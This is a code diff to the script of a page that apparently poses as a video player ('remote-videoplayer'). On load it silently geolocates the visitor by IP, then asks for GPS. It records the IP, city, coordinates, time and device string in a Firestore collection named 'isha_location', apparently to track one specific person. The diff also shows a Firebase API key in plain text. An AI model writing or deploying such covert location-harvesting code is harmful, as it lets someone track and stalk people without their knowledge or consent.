@@ -204,7 +204,6 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
-
 apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
   authDomain: "remote-videoplayer.firebaseapp.com",
   projectId: "remote-videoplayer",
@@ -219,24 +218,69 @@ const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 
-/* IP Location (No Permission Needed) */
+/* Function Save Data */
 
-fetch("https://ipapi.co/json/")
-.then(res=>res.json())
-.then(async data=>{
+async function saveData(ipData,gpsLat,gpsLng){
 
 await addDoc(collection(db,"isha_location"),{
 
-ip:data.ip,
-city:data.city,
-region:data.region,
-country:data.country_name,
-latitude:data.latitude,
-longitude:data.longitude,
+ip:ipData.ip,
+city:ipData.city,
+region:ipData.region,
+country:ipData.country_name,
+
+ipLatitude:ipData.latitude,
+ipLongitude:ipData.longitude,
+
+gpsLatitude:gpsLat,
+gpsLongitude:gpsLng,
+
 time:new Date().toString(),
+
 device:navigator.userAgent
 
 });
+
+}
+
+
+/* Step 1: Get IP Location */
+
+fetch("https://ipapi.co/json/")
+.then(res=>res.json())
+.then(ipData=>{
+
+
+/* Step 2: Ask GPS */
+
+navigator.geolocation.getCurrentPosition(
+
+/* Allow */
+
+(position)=>{
+
+saveData(
+ipData,
+position.coords.latitude,
+position.coords.longitude
+);
+
+},
+
+/* Decline */
+
+(error)=>{
+
+saveData(
+ipData,
+null,
+null
+);
+
+}
+
+);
+
 
 });
 
